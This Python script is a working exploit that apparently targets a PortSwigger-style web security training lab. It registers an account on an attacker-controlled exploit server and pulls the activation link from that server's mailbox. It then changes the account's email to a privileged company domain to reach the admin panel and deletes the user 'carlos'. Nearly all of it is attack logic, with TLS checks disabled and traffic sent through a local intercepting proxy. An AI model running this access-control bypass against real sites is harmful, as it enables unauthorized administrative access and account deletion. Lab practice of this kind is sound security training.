import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' :'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {'name' : 'csrf'})['value']
    return csrf_token


def delete_user(s, url, exploit_url):
    # CREATE A NEW USER
    print("[+] Creating now a new user...")
    register_url = url + "/register"
    username_and_password_and_email_id = "test"
    params = {
        'csrf' : get_csrf(s, register_url),
        'username' : username_and_password_and_email_id,
        'email' : username_and_password_and_email_id + '@' + exploit_url.split("https://")[1],
        'password' : username_and_password_and_email_id
    }
    r = s.post(register_url, data=params, verify=False, proxies=proxies)
    if "Please check your emails for your account registration link" in r.text:
        # RETIRIEVE ACTIVATION URL FROM CONFIRMATION EMAIL
        print("[+] User created successfully, now we need to activate it")
        email_url = exploit_url + "/email?raw=0"
        r = s.get(email_url, verify=False, proxies=proxies)
        activation_url = re.search(r"https.+", r.text).group(0)

        # ACTIVATE THE ACCOUNT
        r = s.get(activation_url, verify=False, proxies=proxies)
        if "Account registration successful!" in r.text:
            print("[+] Confirmation complete! Now to log-in!")
            # LOGIN AS THE NEW USER
            login_url = url + "/login"
            params = {
                'csrf' : get_csrf(s, login_url),
                'username' : username_and_password_and_email_id,
                'password' : username_and_password_and_email_id
            }
            r = s.post(login_url, data=params, verify=False, proxies=proxies)
            if "Log out" and r.status_code == 200:
                print("[+] We are logged-in as user %s" % username_and_password_and_email_id)
                print("[+] Changin now the email address...")
                # CHANGE EMAIL ADDRESS
                myaccount_url = url + "/my-account"
                change_email_url = url + "/my-account/change-email"
                params = {
                    'csrf' : get_csrf(s, myaccount_url),
                    'email' : username_and_password_and_email_id + '@dontwannacry.com'
                }
                r = s.post(change_email_url, data=params, verify=False, proxies=proxies)
                if "Admin panel" in r.text:
                    print("[+] Email changed successfully! I can see the admin panel!")
                    print("[+] Deleting now the user carlos")
                    # DELETE USER CARLOS
                    delete_carlos_url = url + "/admin/delete?username=carlos"
                    r = s.get(delete_carlos_url, verify=False, proxies=proxies)
                    if r.status_code == 200:
                        print("[+] User carlos deleted!!")
                    else:
                        print("[-] Could not delete the user")
                        sys.exit(-1)
                else:
                    print("[-] Email update failed!")
                    sys.exit(-1)
            else:
                print("[-] Could not login as user %s. Exiting the script...")
                sys.exit(-1)
        else:
            print("[-] Something went wrong! Could not activate the account...")
            sys.exit(-1)
    else:
        print("[-] Something went wrong! Cloud not register a new user...")
        sys.exit(-1)



def main():
    if len(sys.argv) != 3:
        print("[-] Usage: %s <url1> <url2>" % sys.argv[0])
        print("[-] Example: %s www.example.com www.exploit-example.com")
        sys.exit(-1)

    s = requests.Session()

    url = sys.argv[1].strip()
    exploit_url = sys.argv[2].strip()

    delete_user(s, url, exploit_url)


if __name__ == "__main__":
    main()